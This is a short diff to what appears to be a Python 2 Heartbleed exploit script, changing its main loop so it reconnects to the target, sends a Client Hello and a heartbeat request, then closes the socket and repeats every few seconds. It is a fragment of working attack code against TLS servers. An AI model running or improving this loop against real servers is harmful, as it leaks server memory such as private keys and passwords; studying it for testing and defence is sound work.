@@ -226,6 +226,9 @@ def main():
         hb = hb3
 
     while True:
+        # connect server
+        s.connect((args[0], opts.port))
+
         print 'Sending Client Hello...'
 
         s.send(hello)
@@ -247,6 +250,7 @@ def main():
         # start sending heartbeat request
         s.send(hb)
         hit_hb(s, hb)
+        s.close()
 
         time.sleep(3)
 
